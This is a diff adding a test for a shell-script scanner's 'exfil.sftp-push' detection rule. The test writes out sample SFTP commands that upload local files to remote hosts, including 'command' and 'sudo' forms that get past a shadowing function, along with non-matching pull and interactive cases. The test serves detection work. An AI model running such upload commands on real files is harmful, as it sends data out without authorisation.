@@ -245,6 +245,51 @@ describe("scan", () => {
     )).toHaveLength(2);
   });
 
+  it("detects static SFTP put uploads without confusing pulls or interactive use", () => {
+    const pushes = [
+      "sftp user@example.test:/upload <<< $'put /tmp/report.txt'",
+      `sudo sftp -P 2222 user@[2001:db8::10]:/drop <<< "put -p ./archive.tgz"`,
+      "command sftp sftp://user@example.test/drop <<< 'mput ./one.txt ./two.txt'",
+    ];
+    for (const source of pushes) {
+      expect(scan(source).findings).toEqual(expect.arrayContaining([
+        expect.objectContaining({
+          ruleId: "exfil.sftp-push",
+          category: "data_exfiltration",
+          confidence: "high",
+        }),
+      ]));
+    }
+
+    const hardNegatives = [
+      "sftp analyst@example.test",
+      "sftp analyst@example.test:/srv/report.txt /tmp/report.txt",
+      "sftp user@example.test:/upload <<< $'get /tmp/report.txt'",
+      "sftp user@example.test:/upload <<< $'ls /tmp'",
+      `sftp user@example.test:/upload <<< "put $source"`,
+      `sftp "$destination" <<< 'put /tmp/report.txt'`,
+      "sftp user@example.test:/upload <<< \"$command\"",
+      "sftp -b /tmp/batch user@example.test",
+      "echo \"sftp user@example.test:/upload <<< 'put /tmp/report.txt'\"",
+      `sftp() { echo "project helper"; }
+       sftp user@example.test:/upload <<< 'put /tmp/report.txt'`,
+    ];
+    for (const source of hardNegatives) {
+      expect(scan(source).findings.some((finding) =>
+        finding.ruleId === "exfil.sftp-push"
+      ), source).toBe(false);
+    }
+
+    const bypassesShadow = scan(`
+      sftp() { echo "project helper"; }
+      command sftp user@example.test:/one <<< 'put /tmp/one'
+      sudo sftp user@example.test:/two <<< 'put /tmp/two'
+    `);
+    expect(bypassesShadow.findings.filter((finding) =>
+      finding.ruleId === "exfil.sftp-push"
+    )).toHaveLength(2);
+  });
+
   it("tracks Python interpreters selected only from trusted discovery candidates", () => {
     const result = scan(`
       which_python=$(which python || which python3 || command -v python3.12)
